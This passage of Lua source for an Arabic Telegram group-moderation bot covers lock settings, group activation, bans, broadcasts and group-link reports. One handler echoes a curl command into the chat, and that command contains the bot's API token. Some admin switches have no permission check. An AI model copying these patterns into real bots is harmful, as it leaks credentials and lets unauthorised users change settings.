if KASPERdx1:get(KASPER..'tags:lock'..msg.chat_id_) then lock_tag = 'مفعل ✔️' else lock_tag = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'bot:location:mute'..msg.chat_id_) then lock_location = 'مفعل ✔️' else lock_location = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'bot:contact:mute'..msg.chat_id_) then lock_contact = 'مفعل ✔️' else lock_contact = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'bot:english:mute'..msg.chat_id_) then lock_english = 'مفعل ✔️' else lock_english = 'معطل ✖️' end
------------fader
if KASPERdx1:get(KASPER..'bot:arabic:mute'..msg.chat_id_) then lock_arabic = 'مفعل ✔️' else lock_arabic = 'معطل ✖️' end
------------fader
if KASPERdx1:get(KASPER..'bot:forward:mute'..msg.chat_id_) then lock_forward = 'مفعل ✔️' else lock_forward = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'bot:document:mute'..msg.chat_id_) then lock_file = 'مفعل ✔️' else lock_file = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'markdown:lock'..msg.chat_id_) then markdown = 'مفعل ✔️' else markdown = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER..'bot:spam:mute'..msg.chat_id_) then lock_spam = 'مفعل ✔️' else lock_spam = 'معطل ✖️' end
------------KASPER
if KASPERdx1:get(KASPER.."bot:welcome"..msg.chat_id_) then send_welcome = 'مفعل ✔️' else send_welcome = 'معطل ✖️' end
------------KASPER
local TXTAR = "✟︙اعدادات المجموعه 🔻 :\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
.."✟︙قفل الحمايه ، "..strict.."\n"
.."✟︙قفل الكل ، "..mute_all.."\n"
.."✟︙قفل الشارحه ، "..mute_cmd.."\n"
.."✟︙قفل الكلايش ، "..lock_spam.."\n"
.."✟︙قفل الروابط ، "..mute_links.."\n"
.."️✟︙قفل الشبكات ، "..lock_wp.."\n"
.."✟︙قفل المعرف ، "..lock_tag.."\n"
.."✟︙قفل الكفران ، "..mute_kaf.."\n"
.."✟︙قفل الفشار ، "..mute_fshar.."\n"
.."✟︙قفل الطائفيه ، "..mute_taf.."\n"
.."✟︙قفل الهاشتاك ، "..lock_htag.."\n"
.."✟︙قفل التوجيه ، "..lock_forward.."\n"
.."✟︙قفل البوتات ، "..mute_bots.."\n"
.."✟︙قفل التعديل ، "..mute_edit.."\n"
.."✟︙قفل التثبيت ، "..lock_pin.."\n"
.."✟︙قفل الاونلاين ، "..mute_in.."\n"
.."✟︙قفل العربيه ، "..lock_arabic.."\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
.."✟︙قفل الانكليزيه ، "..lock_english.."\n"
.."✟︙قفل الفارسيه ، "..mute_farsi.."\n"
.."✟︙قفل الماركداون ، "..markdown.."\n"
.."️✟︙قفل الاشعارات ، "..lock_tgservice.."\n"
.."✟︙قفل الدردشه ، "..mute_text.."\n"
.."✟︙قفل الصور ، "..mute_photo.."\n"
.."✟︙قفل الفيديو ، "..mute_video.."\n"
.."✟︙قفل المتحركه ، "..mute_gifs.."\n"
.."✟︙قفل الاغاني  "..mute_music.."\n"
.."✟︙قفل الصوت ، "..mute_voice.."\n"
.."✟︙قفل الملفات ، "..lock_file.."\n"
.."✟︙قفل الملصقات ، "..lock_sticker.."\n"
.."✟︙قفل الجهات ، "..lock_contact.."\n"
.."️✟︙قفل المواقع ، "..lock_location.."\n"
.."✟︙قفل التكرار ، "..mute_flood.."\n"
.."✟︙الفارسيه بالطرد ، "..mute_farsiban.."\n"
.."✟︙البوتات بالطرد ، "..mute_botsban.."\n"
.."✟︙البوتات بالتقيد ، "..mute_botske.."\n\n"
.."✟︙وضع الترحيب ، "..send_welcome.."\n"
.."✟︙خاصيه التكرار ، "..floodstatus.."\n"
.."✟︙عدد التكرار ، [ "..flood_m.." ]\n"
.."️✟︙عدد السبام ، [ "..spam_c.." ]\n"
.."         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n✟︙[𝐅𝐀𝐄𝐃𝐄𝐑 - 𝐂𝐇](https://t.me/KASPER_ch)\n"
KASPERdx(msg.chat_id_, msg.id_, 1, TXTAR, 1, 'md')
end end 
--     By Developer KASPER     --
if text and text:match("^كول (.*)$")  then
local txt = {string.match(text, "^(كول) (.*)$")}
KASPERdx(msg.chat_id_,0, 1, txt[2], 1, 'md')
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
--     By Developer KASPER     -- 
if (text and text == 'تفعيل ردود البوت') and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
if not KASPERdx1:get(KASPER..'bot:rep:mute'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تفعيل ردود البوت سابقا ', 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تفعيل ردود البوت ', 1, 'md')
KASPERdx1:del(KASPER..'bot:rep:mute'..msg.chat_id_)
end end
if (text and text == 'تعطيل ردود البوت') and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
if KASPERdx1:get(KASPER..'bot:rep:mute'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تعطيل ردود البوت سابقا ', 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تعطيل ردود البوت ', 1, 'md')
KASPERdx1:set(KASPER..'bot:rep:mute'..msg.chat_id_,true)
end end
--     By Developer KASPER     -- 
if text and text:match("^ضع ملاحظه (.*)$") and is_leader(msg) then
local txt = {string.match(text, "^(ضع ملاحظه) (.*)$")}
KASPERdx1:set(KASPER..'owner:note1', txt[2])
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم حفظ الملاحظه ارسل جلب الملاحظه لعرضها ', 1, 'md')
end
--     By Developer KASPER     -- 
if text and text:match("^جلب الملاحظه$") and is_leader(msg) then
local note = KASPERdx1:get(KASPER..'owner:note1')
KASPERdx(msg.chat_id_, msg.id_, 1, note, 1, nil)
end
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^الروابط$") and KASPER11(msg) then
if KASPERdx1:get(KASPER..'bot:links:mute'..msg.chat_id_) then
mute_links = 'مقفوله 🌟'
else
mute_links = 'معطل 🛢'
end
local KASPER = "🎖┋ اعدادات الروابط 🔻 :\n\n"
.." الروابط : "..mute_links.."\n"
KASPERdx(msg.chat_id_, msg.id_, 1, KASPER, 1, 'md')
end end
--     By Developer KASPER     -- 
if text and text:match("^ضع اسم (.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local txt = {string.match(text, "^(ضع اسم) (.*)$")}
changetitle(msg.chat_id_, txt[2])
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تغيير اسم المجموعه ', 1, 'md')
end
--     By Developer KASPER     -- 
if text and text:match("^ضع صوره$") and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙ارسل لي الصوره الان ، ', 1, 'md')
KASPERdx1:set(KASPER..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     By Developer KASPER     -- 
if text and text:match('^المجموعات$') then
local list = KASPERdx1:smembers(KASPER.."bot:groups")
local t = "✟︙مجموعات البوت ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k,v in pairs(list) do
t = t..k.." - {`"..v.."`}\n" 
end
if #list == 0 then
t = '✟︙لا يوجد مجموعات مفعله '
end
KASPERdx(msg.chat_id_, msg.id_, 1,t, 1, 'md')
end
--     By Developer KASPER     -- 
if text and text:match("^الغاء تثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
unpinmsg(msg.chat_id_)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم الغاء تثبيت الرساله ', 1, 'md')
end
--     By Developer KASPER     -- 
if text and text:match("^اعاده تثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local pin_id = KASPERdx1:get(KASPER..'pinnedmsg'..msg.chat_id_)
if pin_id then
pin(msg.chat_id_,pin_id,0)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم اعاده تثبيت الرساله ', 1, 'md')
else end end       
--     By Developer KASPER     -- 
if text and text:match("^طرد الحسابات المحذوفه$") and KASPER11(msg) or text and text:match("^طرد المحذوف$") and KASPER11(msg) then
local function deleteaccounts(extra, result)
for k,v in pairs(result.members_) do 
local function cleanaccounts(extra, result)
if not result.first_name_ then
changeChatMemberStatus(msg.chat_id_, result.id_, "Kicked")
end end
getUser(v.user_id_, cleanaccounts, nil)
end 
KASPERdx(msg.chat_id_, msg.id_, 0,'✟︙تم طرد الحسابات المحذوفه ', 1, 'md')
end 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,offset_ = 0,limit_ = 1096500}, deleteaccounts, nil)
end
--     By Developer KASPER     -- 
if text and text:match("^تنظيف قائمه الحظر$") and KASPER11(msg) then
local function removeblocklist(extra, result)
if tonumber(result.total_count_) == 0 then 
KASPERdx(msg.chat_id_, msg.id_, 0,'✟︙لا يوجد محظورين ', 1, 'md')
else
local x = 0
for x,y in pairs(result.members_) do
changeChatMemberStatus(msg.chat_id_, y.user_id_, 'Left', dl_cb, nil)
x = x + 1
end 
KASPERdx(msg.chat_id_, msg.id_, 0,'✟︙تم تنظيف قائمه حظر الكروب ', 1, 'md')
end
end
getChannelMembers(msg.chat_id_, 0, 'Kicked', 200, removeblocklist, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_}) 
end
--     By Developer KASPER     -- 
if text and text:match("^مسح المحظورين$") and KASPER11(msg) then
local function removeblocklist(extra, result)
if tonumber(result.total_count_) == 0 then 
KASPERdx(msg.chat_id_, msg.id_, 0,'', 1, 'md')
else
local x = 0
for x,y in pairs(result.members_) do
changeChatMemberStatus(msg.chat_id_, y.user_id_, 'Left', dl_cb, nil)
x = x + 1
end 
KASPERdx(msg.chat_id_, msg.id_, 0,'', 1, 'md')
end end
getChannelMembers(msg.chat_id_, 0, 'Kicked', 200, removeblocklist, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_}) 
end 
--     By Developer KASPER     -- 
if text and text:match("^معلومات المجموعه$") and KASPER11(msg) then
function gpinfo(arg,data)
-- vardump(data) 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙ايدي المجموعة » ( '..msg.chat_id_..' )\n✟︙عدد الادمنيه » ( *'..data.administrator_count_..' )*\n✟︙عدد المحظورين » ( *'..data.kicked_count_..' )*\n✟︙عدد الاعضاء » ( *'..data.member_count_..' )*\n', 1, 'md') 
end 
getChannelFull(msg.chat_id_, gpinfo, nil) 
end 
if text and text:match('^كشف (-%d+)') and KASPER11(msg) then
local chattid = text:match('كشف (-%d+)') 
if not is_admin(msg.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙للمطورين فقط ', 1, 'md')
else
function KASPER_re(arg,data)
function KASPER(f1,f2)
function KASPER333(t1,t2)
local list = KASPERdx1:smembers(KASPER.."bot:monsh:" .. chattid)
if list[1] or list[2] or list[3] or list[4] then
user_info = KASPERdx1:get(KASPER.."user:Name" .. (list[1] or list[2] or list[3] or list[4]))
end
if user_info then
monsh = user_info
else
monsh = "لا يوجد"
end
local Monsh = KASPERdx1:scard(KASPER.."bot:monsh:" .. chattid) or "0"
local Baned = KASPERdx1:scard(KASPER.."bot:banned:" .. chattid) or "0"
local Owner = KASPERdx1:scard(KASPER.."bot:owners:" .. chattid) or "0"
local Muted = KASPERdx1:scard(KASPER.."bot:muted:" .. chattid) or "0"
local Tkeed = KASPERdx1:scard(KASPER.."bot:keed:" .. chattid) or "0"
local Momod = KASPERdx1:scard(KASPER.."bot:momod:" .. chattid) or "0"
local Vip = KASPERdx1:scard(KASPER.."bot:vipmem:" .. chattid) or "0"
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end end
KASPERdx1:set(KASPER.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "@KASPER_ch")) 
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙المنشئ ⌯» ["..monsh.."]\n\n✟︙الرابط ، ["..title_name(chattid).."]("..(t2.invite_link_ or "t.me/KASPER_CH")..")\n✟︙ايديها ⌯» *"..msg.chat_id_.."*\n✟︙عدد الاعضاء ⌯» *"..data.member_count_.."* \n✟︙عدد المدراء ⌯» *"..Owner.."*\n✟︙عدد المنشئين ⌯» *"..Monsh.."*\n✟︙عدد الادمنيه ⌯» *"..Momod.."*\n✟︙عدد المكتومين ⌯» *"..Muted.."*\n✟︙عدد المحظورين ⌯» *"..Baned.."*\n✟︙عدد المقيدين ⌯» *"..Tkeed.."*\n✟︙عدد المميزين ⌯» *"..Vip.."*\n", 1,"md")
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(chattid).ID
}, KASPER333, nil)
end
openChat(msg.chat_id_,KASPER) 
end
getChannelFull(chattid, KASPER_re, nil)
end end 
--     By Developer KASPER     -- 
if text and text:match("^غادر (-%d+)$")  and KASPER11(msg) then
if not KASPERdx1:get(KASPER..'lock:add'..msg.chat_id_) then
local txt = { string.match(text, "^(غادر) (-%d+)$")}
if not is_sudo(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙للمطورين فقط ', 1, 'md')
else 
local leavegp = function(extra, result)
if result.id_ then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙المجموعه ⌯» {" .. result.title_ .. "}\n✟︙تمت المغادره منها بامر المطور ", 1, "md")
KASPERdx(txt[2], 0, 1, '✟︙بامر من المطور تم مغادره المجموعه\n✟︙لاستعاده البوت راسل المطور ادناه \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n [✟︙مطور البوت ](t.me/'..SudoKASPER..')', 1, 'md') 
chat_leave(result.id_, bot_id)
KASPERdx1:srem(KASPER.."bot:groups", result.id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لم تتم اضافتي فيها لاقوم بمغادرتها ", 1, "md")
end end 
getChat(txt[2], leavegp) 
end end end 
--     By Developer KASPER     -- 
if text == 'تفعيل ضافني' and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
local KASPER = '✟︙اهلا عزيزي ، '..renk_KASPER(msg)..' \n✟︙تم تفعيل منو ضافني'
KASPERdx( msg.chat_id_, msg.id_, 1, KASPER, 1, "md") 
KASPERdx1:del(KASPER..'Added:Me'..msg.chat_id_) 
end
if text == 'تعطيل ضافني' and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
local KASPER = '✟︙اهلا عزيزي ، '..renk_KASPER(msg)..' \n✟︙تم تعطيل منو ضافني'
KASPERdx( msg.chat_id_, msg.id_, 1, KASPER, 1, "md") 
KASPERdx1:set(KASPER..'Added:Me'..msg.chat_id_,true)  
end
--     By Developer KASPER     -- 
if text == 'تفعيل البوت الخدمي' then 
local  KASPER = '✟︙تم تفعيل البوت الخدمي ' 
KASPERdx( msg.chat_id_, msg.id_, 1, KASPER, 1, "md") 
KASPERdx1:del(KASPER..'lock:bot:free'..bot_id) 
end
if text == 'تعطيل البوت الخدمي' then 
KASPER = '✟︙تم تعطيل البوت الخدمي ' 
KASPERdx( msg.chat_id_, msg.id_, 1, KASPER, 1, "md") 
KASPERdx1:set(KASPER..'lock:bot:free'..bot_id,true) 
end
--     By Developer KASPER     -- 
if text == 'تفعيل التنبيه' then 
if not is_sudo(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙للمطورين فقط ', 1, 'md')
else 
local  KASPER = '✟︙تم تفعيل التنبيه على تغيير\n✟︙{ صوره - اسم - معرف } الاعضاء\n✟︙في كل مجموعات البوت' 
KASPERdx( msg.chat_id_, msg.id_, 1, KASPER, 1, "md") 
KASPERdx1:del(KASPER..'lock:bot:ttt'..bot_id) 
end end
if text == 'تعطيل التنبيه' then 
if not is_sudo(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙للمطورين فقط ', 1, 'md')
else 
KASPER = '✟︙تم تعطيل التنبيه على تغيير\n✟︙{ صوره - اسم - معرف } الاعضاء\n✟︙في كل مجموعات البوت' 
KASPERdx( msg.chat_id_, msg.id_, 1, KASPER, 1, "md") 
KASPERdx1:set(KASPER..'lock:bot:ttt'..bot_id,true) 
end end
if text and text == "تفعيل تنبيه التغيرات" and KASPER11(msg) then
if KASPERdx1:get(KASPER..'lock:bot:ttt'..bot_id) then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙التنبيه على تغيير\n✟︙{ صوره - اسم - معرف } الاعضاء\n✟︙معطل في كل الكروبات من قبل المطور  ', 1, 'md')
return false 
end
if not is_owner(msg.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لمدراء المجموعه فما فوق ', 1, 'md')
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تفعيل التنبيه على تغيير\n✟︙{ صوره - اسم - معرف } الاعضاء\n✟︙في هذه المجموعه  ', 1, 'md')
KASPERdx1:del(KASPER.."lock:bot:ttt2:"..msg.chat_id_)
end end
if text and text == "تعطيل تنبيه التغيرات" and KASPER11(msg) then 
if not is_owner(msg.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لمدراء المجموعه فما فوق ', 1, 'md')
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تعطيل التنبيه على تغيير\n✟︙{ صوره - اسم - معرف } الاعضاء\n✟︙في هذه المجموعه  ', 1, 'md')
KASPERdx1:set(KASPER.."lock:bot:ttt2:"..msg.chat_id_,"ok")
end end
--     By Developer KASPER     -- 
if text == 'تفعيل جلب الصوره' and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then   
if KASPERdx1:get(KASPER..'lock:get:photo'..msg.chat_id_) then
KASPER = '*✟︙تم تفعيل جلب الصوره الشخصيه ،*'  
KASPERdx( msg.chat_id_, msg.id_, 1, KASPER, 1, "md") 
KASPERdx1:del(KASPER..'lock:get:photo'..msg.chat_id_) 
else
KASPER = '*✟︙تم تفعيل جلب الصوره الشخصيه مسبقا ،*'  
KASPERdx( msg.chat_id_, msg.id_, 1, KASPER, 1, "md") 
end end
if text == 'تعطيل جلب الصوره' and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then   
if not KASPERdx1:get(KASPER..'lock:get:photo'..msg.chat_id_) then
KASPER = '*✟︙تم تعطيل جلب الصوره الشخصيه ،*'  
KASPERdx( msg.chat_id_, msg.id_, 1, KASPER, 1, "md") 
KASPERdx1:set(KASPER..'lock:get:photo'..msg.chat_id_,true) 
else
KASPER = '*✟︙تم تعطيل جلب الصوره الشخصيه مسبقا ،*'  
KASPERdx( msg.chat_id_, msg.id_, 1, KASPER, 1, "md") 
end end
--     By Developer KASPER     -- 
if text and text == "تفعيل الرابط" and KASPER11(msg) then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تفعيل الرابط ', 1, 'md')
KASPERdx1:del(KASPER.."bot:tt:link:"..msg.chat_id_)
end
if text and text == "تعطيل الرابط" and KASPER11(msg) then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تعطيل الرابط ', 1, 'md')
KASPERdx1:set(KASPER.."bot:tt:link:"..msg.chat_id_,"ok")
end
--     By Developer KASPER     -- 
if text and text:match('^تفعيل$') and KASPER11(msg) and is_admin(msg.sender_user_id_, msg.chat_id_) then
function adding(extra,result,success)
local txt = {string.match(text, "^(تفعيل)$")}
local function promote_admin(extra, result, success)
local admins = result.members_
for i=0 , #admins do
KASPERdx1:sadd(KASPER..'bot:momod:'..msg.chat_id_,admins[i].user_id_)
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
KASPERdx1:sadd(KASPER.."bot:monsh:"..msg.chat_id_,owner_id)
end end end 
getChannelMembers(msg.chat_id_, 0, 'Administrators', 200, promote_admin)
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if KASPERdx1:get(KASPER.."bot:enable:"..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙المجموعه : *'..title_name(msg.chat_id_)..'*\n✟︙مفعله سابقا بالبوت .', 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙اهلا عزيزي '..renk_KASPER(msg)..'\n✟︙تم تفعيل المجموعه ورفع المشرفين .', 1, 'md')
openChat(msg.chat_id_,KASPER)
KASPERdx1:sadd("KASPER:addg"..bot_id, msg.chat_id_)
function KASPER(f1,f2)
function KASPER333(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
t2.invite_link_ = link.result
end end  
KASPERdx1:set(KASPER.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
KASPERdx(tostring((KASPERdx1:get(KASPER.."bot:leader:gr") or bot_owner)), 0, 1, "✟︙تم تفعيل مجموعه جديده  \n✟︙معرف المطور ⌯» @"..(result.username_ or "لا يوجد").."\n✟︙ايدي المطور ⌯» `"..msg.sender_user_id_.."`\n✟︙معلومات المجموعه ،  \n\n✟︙اسم المجموعه ⌯»  *"..f2.title_.."*\n✟︙ايدي المجموعه ⌯» `"..msg.chat_id_.."`\n✟︙رابط المجموعه ، \n✟︙"..(t2.invite_link_ or "Error").."\n" , 1, 'md')
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, KASPER333, nil)
end
openChat(msg.chat_id_,KASPER) 
KASPERdx1:set(KASPER.."bot:enable:"..msg.chat_id_,true)
KASPERdx1:setex(KASPER.."bot:charge:"..msg.chat_id_,86400,true)
KASPERdx1:sadd("KASPER:addg"..bot_id, msg.chat_id_)
local send_to_bot_owner = function(extra, result)
local v = tonumber(bot_owner)             
end end end end
getUser(msg.sender_user_id_,adding)
end
--     By Developer KASPER     -- 
if text and text:match('^تعطيل$') and is_monsh(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
local txt = {string.match(text, "^(تعطيل)$")}
if not KASPERdx1:get(KASPER.."bot:enable:"..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙المجموعه : *'..title_name(msg.chat_id_)..'*\n✟︙معطله سابقا بالبوت .', 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙اهلا عزيزي '..renk_KASPER(msg)..'\n✟︙تم تعطيل المجموعه .', 1, 'md')
KASPERdx1:del(KASPER.."bot:charge:"..msg.chat_id_)
KASPERdx1:del(KASPER.."bot:enable:"..msg.chat_id_)
KASPERdx1:srem("KASPER:addg"..bot_id, msg.chat_id_)
local v = tonumber(bot_owner)          
end end
--     By Developer KASPER     -- 
if text and text:match('^[Rr]em(-%d+)$') and is_admin(msg.sender_user_id_, msg.chat_id_) then
local gp = {string.match(text, "^([Rr]em)(-%d+)$")}
KASPERdx1:del(KASPER.."bot:charge:"..gp[2])
local v = tonumber(bot_owner)       
end
--     By Developer KASPER     -- 
if text and text:match("^تفعيل كل الكروبات$") and KASPER11(msg) then
local gps = KASPERdx1:smembers(KASPER.."bot:groups") or 0
local gps2 = KASPERdx1:smembers("KASPER:addg"..bot_id) or 0
for i=1,#gps do
KASPERdx1:sadd("KASPER:addg"..bot_id, gps[i])
KASPERdx1:set(KASPER.."bot:enable:"..gps[i],true)
KASPERdx1:set( KASPER.."bot:charge:"..gps[i],true)
end
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تفعيل المجموعات *{'..(#gps - #gps2)..'}*', 1, 'md')
end
if text and text:match("^تعطيل كل الكروبات$") and KASPER11(msg) then
local gps = KASPERdx1:smembers(KASPER.."bot:groups") or 0
local gps2 = KASPERdx1:smembers("KASPER:addg"..bot_id) or 0
for i=1,#gps do
KASPERdx1:del("KASPER:addg"..bot_id, gps[i])
KASPERdx1:del(KASPER.."bot:enable:"..gps[i],true)
KASPERdx1:del( KASPER.."bot:charge:"..gps[i],true)
end
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تعطيل المجموعات *{'..(#gps - #gps2)..'}*', 1, 'md')
end   
--     By Developer KASPER     -- 
if text and text:match("^الدعم$") or text:match("^المطور$") and KASPER11(msg) then
function adding(extra,result,success)
function KASPER(f1,f2)
function KASPER333(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end end
KASPERdx1:set(KASPER.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
KASPERdx(tostring((KASPERdx1:get(KASPER.."bot:leader:gr") or bot_owner)), 0, 1, "✟︙هناك من بحاجه للمساعده  \n✟︙معرف الشخص ⌯» @"..(result.username_ or "لا يوجد").."\n✟︙ايدي الشخص ⌯» `"..msg.sender_user_id_.."`\n✟︙معلومات المجموعه ،  \n\n✟︙اسم المجموعه ⌯»  *"..f2.title_.."*\n✟︙ايدي المجموعه ⌯» `"..msg.chat_id_.."`\n✟︙رابط المجموعه ، \n✟︙"..(t2.invite_link_ or "Error").."\n" , 1, 'md')
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, KASPER333, nil)
end
openChat(msg.chat_id_,KASPER) 
end
getUser(msg.sender_user_id_,adding)
end
--     By Developer KASPER     -- 
if text == 'جلب نسخه الملف' then
if not is_leader(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙للمطور الاساسي فقط ', 1, 'md')
else
if not KASPERdx1:get(KASPER..'lock:add'..msg.chat_id_) then
sendDocument(bot_owner, 0, 0, 1, nil, './KASPER.lua', dl_cb, nil)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم ارسال نسخه الملف الى خاصك مع البوت ', 1, 'md')
end end end
--     By Developer KASPER     -- 
if text == 'روابط الكروبات' or text == 'روابط المجموعات' then
if not is_leader(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙للمطور الاساسي فقط ', 1, 'md')
else
local groups = function(extra, result) 
local num = (KASPERdx1:scard(KASPER.."bot:groups"))
local list = KASPERdx1:smembers(KASPER.."bot:groups")
local text = "~ Groups_Bots_In_the_Bot_Of_Source_KASPER ~ @KASPER_ch\n\n"
for k,v in pairs(list) do
local GroupsMonsh = KASPERdx1:scard(KASPER.."bot:monsh:"..v) or 0
local GroupsOwner = KASPERdx1:scard(KASPER.."bot:owners:"..v) or 0
local GroupsMod = KASPERdx1:scard(KASPER.."bot:momod:"..v) or 0
local Groupslink = KASPERdx1:get(KASPER.."bot:group:link" ..v)
if result.first_name_ then
if #result.first_name_ < 35 then
else
for KASPER222 in string.gmatch(result.first_name_, "[^%s]+") do
result.first_name_ = KASPER222
break
end end end
text = text..k.."✟︙Group ID  : [ "..v.." ]\n✟︙Group Link : [ "..(Groupslink or "Not Found").." ]\n✟︙Group Monsh : [ "..GroupsMonsh.." ]\n✟︙Group Owners : [ "..GroupsOwner.." ]\n✟︙Group Momods : [ "..GroupsMod.." ] \n~~~~~~~~~~~~~~~~~\n"
end
local file = io.open('Groups_Bot.txt', 'w')
file:write(text)
file:close()
local dxx = 'https://api.telegram.org/bot' .. tokenbot .. '/sendDocument'
local dxxx = 'curl "' .. dxx .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'Groups_Bot.txt' .. '"'
io.popen(dxxx)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙عزيزي ⌯» *'..result.first_name_..'*\n✟︙جاري ارسال نسخه للمجموعات \n✟︙تحتوي على *('..num..')* مجموعه\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n', 1, 'md')
sleep(1.5)
KASPERdx(msg.chat_id_, msg.id_, 1, dxxx, 1, 'md')
end
getUser(msg.sender_user_id_, groups)
end end
--     By Developer KASPER     -- 
if text == "نشر بالخاص" and msg.reply_to_message_id_ == 0 and is_leader(msg) or text == " اذاعه خاص " and msg.reply_to_message_id_ == 0 and is_leader(msg) then 
KASPERdx1:setex(KASPER.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local KASPER = '✟︙اهلا عزيزي ، '..renk_KASPER(msg)..'\n✟︙ارسل لي سواء \n✟︙❨ ملصق ، متحركه ، صوره ، رساله ❩ \nللخروج ارسل ،  ( الغاء ) \n '
KASPERdx( msg.chat_id_, msg.id_, 1, KASPER, 1, "md") 
return false
end 
if KASPERdx1:get(KASPER.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم الغاء امر الاذاعه ،", 1, 'md')
KASPERdx1:del(KASPER.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
list = KASPERdx1:smembers(KASPER..'bot:userss') 
if msg.content_.text_ then
for k,v in pairs(list) do 
KASPERdx(v, 0, 1, '['..msg.content_.text_..']', 1, 'md')
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
